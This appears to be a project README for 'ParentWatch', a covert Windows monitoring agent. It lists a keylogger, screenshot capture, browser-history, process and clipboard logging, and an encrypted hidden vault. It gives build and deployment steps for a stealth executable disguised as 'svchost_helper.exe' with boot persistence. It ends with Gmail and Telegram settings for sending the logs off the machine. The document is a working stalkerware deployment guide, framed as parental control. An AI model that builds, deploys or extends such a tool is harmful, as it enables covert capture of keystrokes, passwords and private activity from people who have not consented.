# ParentWatch — Agent (Phase 1)

Silent PC monitoring agent. Logs keystrokes, screenshots, browser history, running apps, and clipboard. Stores everything encrypted in a hidden protected vault. Runs automatically on every boot.

---

## WHAT IT DOES

| Module | Detail |
|--------|--------|
| Keylogger | Every keystroke + active window title, timestamped |
| Screenshots | Full screen capture every 60 seconds (configurable) |
| Browser History | Chrome, Edge, Firefox — URLs, titles, timestamps |
| Process Tracker | Which apps opened/closed and when |
| Clipboard | Everything copied to clipboard |
| Vault | AES-256 encrypted, hidden system folder, ACL locked |
| Persistence | Registry + Task Scheduler — survives reboot |
| Stealth | No console window, no taskbar icon, disguised process name |

---

## SETUP

### 1. Install Python dependencies
```
pip install -r requirements.txt
```

### 2. Set your password
Open `config.py` and change:
```python
VAULT_PASSWORD = "CHANGE_THIS_PASSWORD_BEFORE_USE"
```
**Use a strong password. You cannot recover data without it.**

### 3. Build the exe
```
python build.py
```
Output: `dist/svchost_helper.exe`

### 4. Deploy
Copy `svchost_helper.exe` to the child's PC and run it once.
After first run it installs itself to startup — never needs to be run manually again.

---

## READING THE VAULT

On the child's PC, run `vault/read_vault.py`:
```
python vault/read_vault.py
```
Or compile it separately to its own exe:
```
pyinstaller --onefile --name vault_reader vault/read_vault.py
```
Enter your vault password → see all logs, export screenshots.

---

## ERASING THE VAULT

```
python vault/erase_vault.py
```
Type `YES` to confirm. Overwrites all files with zeros before deleting.

---

## VAULT LOCATION

```
C:\Windows\System32\svchost_cache\
```
Hidden, system-flagged, ACL-locked to SYSTEM account only.

---

## FILE STRUCTURE

```
agent/
├── main.py                  ← entry point
├── config.py                ← all settings
├── requirements.txt
├── build.py                 ← compile to exe
├── modules/
│   ├── keylogger.py
│   ├── screenshot.py
│   ├── browser_history.py
│   ├── process_tracker.py
│   └── clipboard.py
├── vault/
│   ├── vault_manager.py     ← encrypt/decrypt/ACL
│   ├── read_vault.py        ← read stored data
│   └── erase_vault.py       ← secure wipe
└── persistence/
    └── startup.py           ← registry + task scheduler
```

---

## NEXT PHASES

- **Phase 2** — Delivery: email, Telegram, WhatsApp, webhook, central server push
- **Phase 3** — Controller exe: remote view, AI summary, remote erase
- **Phase 4** — Central server + dashboard: all devices in one place

---

## NOTES

- Windows only (all modules use Win32 APIs)
- Requires Python 3.9+ for build
- Run build on Windows — PyInstaller produces platform-native exe
- First run needs to execute once with normal user privileges to install persistence

---

## GMAIL SETUP

1. Go to your Google account → **Security** → **2-Step Verification** → enable it
2. Then go to **App Passwords** → create one → select "Mail" → copy the 16-char password
3. In `config.py` set:
```python
EMAIL_FROM     = "your_sender@gmail.com"
EMAIL_PASSWORD = "xxxx xxxx xxxx xxxx"   # the 16-char app password
EMAIL_TO       = "your_receive@gmail.com"
```
App password is NOT your Gmail login password. It's a separate one Google generates.

---

## TELEGRAM SETUP

1. Open Telegram → search `@BotFather` → send `/newbot` → follow steps → copy the token
2. Start a chat with your new bot
3. Get your chat ID: open `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates` in browser after sending the bot any message → copy the `"id"` number from `"chat"`
4. In `config.py` set:
```python
TELEGRAM_BOT_TOKEN = "123456:ABCdef..."
TELEGRAM_CHAT_ID   = "987654321"
```

---

## VAULT PATH FIX

Vault now stores at:
```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\SystemCache\
```
Instead of System32 (which requires admin write access). This works silently for all users.
